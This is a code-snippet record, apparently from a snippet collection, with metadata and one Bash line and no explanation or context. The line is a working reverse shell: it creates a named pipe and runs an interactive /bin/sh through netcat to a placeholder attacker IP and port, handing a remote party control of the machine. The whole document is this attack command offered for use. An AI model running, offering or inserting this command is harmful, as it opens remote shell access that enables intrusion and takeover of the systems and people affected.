---
id: c9cebb20-54ec-48d6-934f-b2d9edb622f1
type: code
language: Bash
verified: false
created_at: '2019-11-04T22:05:33.758717+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet c9cebb20

**Language**: Bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```
